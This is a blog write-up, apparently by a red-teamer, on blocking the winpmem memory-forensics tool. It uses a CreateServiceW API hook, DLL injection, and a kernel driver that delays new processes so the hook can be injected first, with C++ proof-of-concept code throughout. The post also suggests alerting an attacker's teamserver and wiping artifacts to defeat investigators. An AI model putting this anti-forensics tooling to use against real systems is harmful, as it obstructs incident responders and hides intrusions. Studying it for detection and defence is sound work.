---
layout: default
title: "Blocking Remote Memory Forensics With API Hooking"
permalink: /blocking-remote-memory-forensics/
---

# Blocking Remote Memory Forensics With API Hooking

You can find all of the accompanying source code for this blog post [here](https://github.com/passthehashbrowns/DriverBlock).

I'm wrapping up studying for my GCFA, and one of focal points of that course is memory forensics. Specifically, remote memory forensics at scale. This raises the question of how to capture memory images remotely, without plugging in to the hardware. More importantly, how can an attacker detect and subvert this memory capture?

I pulled up the documentation for [Rekall](https://github.com/google/rekall) to dig in. Rekall is a free, open source forensics toolkit from Google. Searching for "Rekall memory capture" yields a few results, such as this [SANS DFIR cheatsheet](https://digital-forensics.sans.org/media/rekall-memory-forensics-cheatsheet.pdf). In the top left corner is a blurb on creating a memory image, using winpmem. Searching for winpmem in the [Rekall docs](https://rekall.readthedocs.io/en/gh-pages/Tools/pmem.html) will bring up a helpful description of how winpmem does memory captures, which is by loading a kernel driver.

With this information I went back to the Rekall repository and searched for "driver". Fortunately the list of results was short and the one that stuck out was in winpmem.cpp. Browsing through the source will tell us that the install_driver function gets called to, well, install the driver. `install_driver` uses `OpenSCManager` to open a handle to the Service Control Manager, and then calls `CreateService`. A quick search for `CreateService` yields an [MSDN document](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew). It looks like this will be the API call that we want to tamper with.

To confirm, I grabbed the `install_driver` and `uninstall_driver` functions from winpmem and put them in a standalone program. I also grabbed a [Hello World kernel driver](https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver) for a simple proof of concept. Using these, I put my loader program into API Monitor to look for the `CreateService` API call. As expected, it shows up when the driver gets loaded.

![api_monitor](/images/driverblock/api_monitor.png)

Sweet. Now let's see what happens when we hook it.

The first thing we'll need for that is the bytes to search for to identify the `CreateService` address in memory. This is easy to find by firing up WinDBG, attaching it to our loader program, and then setting a breakpoint on the `CreateService` function. The MSDN docs state that `CreateService` is located in advapi32.dll, but API Monitor correctly reports that it's from sechost.dll. To confirm this, I set a wildcard breakpoint in WinDBG: `bm advapi32!*Create*`

This will resolve and set a break on anything with Create in it. If we allow our program to continue, a breakpoint is hit for `CreateServiceWStub`. This probably means that advapi32.dll is using a stub to redirect the program flow to the correct function, which we can confirm by hitting "Step Into" a few times and seeing that the next function called is `sechost!CreateServiceW`.

![windbg](/images/driverblock/win_dbg_createservicew.png)

Great, now we know what we need to grab. Doing a quick `uf` on the first memory address of `CreateServiceW` will give us the bytes. We need to grab a lot of them, as `CreateServiceA` and `CreateServiceW` both start with the same bytes but we need to make sure we're hitting `CreateServiceW`.

I used a basic DLL injector and just did a search for the name of my driver loader program at this stage. Using windbg we can confirm that we've found the correct function. If this doesn't work then we probably need to grab more bytes from CreateServiceW, as the first time I did this it grabbed CreateServiceA.

![windbg_offset](/images/driverblock/windbg_createservicew_offset.png)

Now that we know we're hitting the right function, we can write our hook. I'm not going to go into detail into the basic mechanics of this, but if you want an explanation you can look at [bats3c's EvtMute blog](https://labs.jumpsec.com/2020/09/04/pwning-windows-event-logging-with-yara-rules/), my [Prefetch mute blog](https://passthehashbrowns.github.io/muting-prefetch/) (which uses the same code), or here's a post [from xpn](https://blog.xpnsec.com/azuread-connect-for-redteam/).
```cpp
VOID WINAPI CreateServiceHook(SC_HANDLE hSCManager,LPCWSTR lpServiceName,LPCWSTR lpDisplayName,DWORD dwDesiredAccess,DWORD dwServiceType,DWORD dwStartType,DWORD dwErrorControl,LPCWSTR lpBinaryPathName,LPCWSTR lpLoadOrderGroup,LPDWORD lpdwTagId,LPCWSTR lpDependencies,LPCWSTR lpServiceStartName,LPCWSTR lpPassword) {
	char driverName[1024];

	sprintf_s(driverName, "%ls", lpDisplayName);

	if (strstr(driverName, "TargetDriver"))
	{
		OutputDebugStringA("[+] Found target driver!\n");
		return;
	}

	DoOriginalCreateService(hSCManager,lpServiceName,lpDisplayName,dwDesiredAccess,dwServiceType,dwStartType,dwErrorControl,lpBinaryPathName,lpLoadOrderGroup,lpdwTagId,lpDependencies,lpServiceStartName,lpPassword);
}
```

The above is a simple proof of concept check for a hardcoded kernel driver name. If the string is one we want to block, simply return. Otherwise we'll restore the function, create the service, and rehook.

Then we can run our program.

![successful_run](/images/driverblock/successful_run.png)

The kernel loader program will return successfully but the driver will not be loaded.

The same logic applies to 32 bit processes, though you'll need to use a different trampoline. I used the one from [ired.team](https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++).

Here it is being applied to winpmem. Note: I loaded the DLL into winpmem during the initial breakpoint. For injection I used the code from [SylantStrike](https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/) and polled for the winpmem process.

![winpmem_block](/images/driverblock/winpmem_write_successful_block.png)

As you can see, it successfully blocked winpmem from taking a memory image! However there is a caveat: as mentioned I injected the DLL with a WinDBG breakpoint. Unfortunately, it's a race condition between loading the hook and winpmem loading the driver. From my testing, I have not been able to beat a program that instantly loads a driver.

Now let's look at how we can solve this issue using a kernel driver.

# Kernel Drivers

Thanks to ired.team, most of our work is already done here for us. They have a great [blog post](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/subscribing-to-process-creation-thread-creation-and-image-load-notifications-from-a-kernel-driver) detailing how to subscribe to several event notifications. In this case we only need to set PsCreateProcessEx, as this will allow us to filter processes. The following code is the core of loading and unloading the driver.

Note: I would heavily recommend doing any testing of kernel drivers in a virtual machine. If your kernel driver crashes it will BSOD your system.

```cpp
void DriverUnload(PDRIVER_OBJECT dob)
{
	DbgPrint("Driver unloaded, deleting symbolic links and devices\n");
	PsSetCreateProcessNotifyRoutineEx(sCreateProcessNotifyRoutineEx, TRUE);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS status = 0;

	// routine that will execute when our driver is unloaded/service is stopped
	DriverObject->DriverUnload = DriverUnload;

	DbgPrint("Driver loaded\n");

	// subscribe to notifications
	PsSetCreateProcessNotifyRoutineEx(sCreateProcessNotifyRoutineEx, FALSE);
	DbgPrint("Listeners isntalled..\n");

	return STATUS_SUCCESS;
}
```

Other than that, this code will print the name of any processes being run.

```cpp
void sCreateProcessNotifyRoutineEx(PEPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO createInfo)
{
	UNREFERENCED_PARAMETER(process);
	UNREFERENCED_PARAMETER(pid);
	if (createInfo != NULL)
	{
    DbgPrint("Process created: %ls", createInfo->CommandLine->Buffer);
	}
}
```

When we load up the driver with DebugView running, we'll see our process creation print statements.

![kernel_poc](/images/driverblock/kernel_driver_poc.png)

Now we could implement the API hooking at the kernel level, but since kernel drivers don't have access to the same libraries this tends to be very difficult. Hooking the SSDT is one option, but this has become very hard due to all of the integrity checks implemented by Microsoft. There are also a few proof of concept projects out there that implement DLL injection from a driver, but I decided to just have the driver send information to a userland process that will then handle the injection.

If like me you've never worked with kernel drivers, there a few ways for a driver to communicate with userland processes. Writing to a file, registry keys, and named pipe are all options. I decided to go with a named pipe, primarily because that was already in the ired.team code so the framework was laid out.

```cpp
TCHAR messageFromKernel[200];
size_t const cchDest = 200;
LPCTSTR pszFormat = TEXT("%d");
LPCTSTR existingFormat = TEXT("%s,%d");
if (strlen(messageFromKernel) > 0)
{
	RtlStringCchPrintfA(messageFromKernel, cchDest, existingFormat, messageFromKernel, pid);
}
else
{
	RtlStringCchPrintfA(messageFromKernel, cchDest, pszFormat, pid);
}
```

This is a few lines that will handle sending the PIDs over to our client program. We can implement a check above this to filter for process name, or we can just inject into every process. Keep in mind that the latter option is very loud, but since we're loading a kerner driver we could tamper with logging and such.

The next issue that we have to deal with is the same as with the user mode process: We need to find a way to inject our DLL into the process before the driver is loaded. I'll add a disclaimer here: my solution is kinda hacky and I'm sure there's a better way to do this.

To buy us some time, we can use `KeDelayExecutionThread`. If we do this after we've added the PID to be sent to our userland process, then while the thread is suspended our userland process can inject into the target. The code below will delay the thread for a second but this can be varied. Keep in mind that the shorter our delay, the more frequently our user space process will need to poll for new processes to target.

```cpp
LARGE_INTEGER Delay;
Delay.QuadPart = -10 * 1000 * 1000;
KeDelayExecutionThread(KernelMode, FALSE, &Delay);
```

Below is the user mode code that I used. It opens a handle to the IOCTL established by the kernel driver and polls to see if there are any new processes to inject into. This code will poll 10 times a second, but again this can be changed to adjust how long the driver will suspend processes for.

```cpp
#define SIOCTL_TYPE 40000

// The IOCTL function codes from 0x800 to 0xFFF are for customer use.
#define IOCTL_HELLO\
 CTL_CODE( SIOCTL_TYPE, 0x800, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
vector<string> __cdecl GetProcesses(){
    HANDLE hDevice;
    const char* welcome = "Give me processes";
    DWORD dwBytesRead = 0;
    char ReadBuffer[50] = { 0 };
    std::vector<string> vect;
    while (vect.size() == 0)
    {
        hDevice = CreateFile(L"\\\\.\\DriverBlockerLink", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        DeviceIoControl(hDevice, IOCTL_HELLO, (LPVOID)welcome, strlen(welcome), ReadBuffer, sizeof(ReadBuffer), &dwBytesRead, NULL);
        CloseHandle(hDevice);
        if (strlen(ReadBuffer) != 0) {
            printf("Got message: %s\n", ReadBuffer);
            vect.push_back(ReadBuffer);
        }
    }
    return vect;
}
int inject(int pid)
{
 //insert your injection method, here's an example: https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection
}

int main(int argc, char* argv[]) {
    while (true) {
        vector<string> processes = GetProcesses();
        for (int i = 0; i < processes.size(); i++)
        {
            inject(stoi(processes[i]));
       }
        Sleep(1000);
    }
}
```

If we put all of this together:

![kernel_block_target_driver](/images/driverblock/kernel_driver_block_target_test.png)

Great, we can block our test driver loader. But what about something practical?

![pmem_kernel_driver_block](/images/driverblock/kernel_driver_pmem_block.png)

Sweet, we successfully intercepted and blocked winpmem! The caveat here is that an Access Denied message may stick out to a keen eyed defender, especially one who is already suspicious (hence why they're taking remote memory images). In my opinion, this detection and blocking doesn't serve to prevent a defender from taking a memory capture. If they really want to, they'll plug a write blocker into the host. Instead, I think that its purpose is to alert an operator and allow them to decide what to do next. That could be through manual means such as sending up a flair via email or a web request to our teamserver, though in some cases defenders may have isolated machines being targeted for forensics on the network. In that case where an alert may not be able to go through, we could simply delete any artifacts from the system, unload our driver, and reboot the system to wipe any artifacts from memory.

## Considerations and final thoughts
In terms of practicality this approach is pretty loud. It requires us to load a kernel driver and use a userland process to inject into every process. I say every process because right now we don't have a good way of knowing which process is winpmem, and we need to make sure that we beat the driver load.

So how could we go about doing this? In my next post I'll talk about applying some classical antivirus techniques to create a pseudo-EDR, specifically targeting forensics tools.
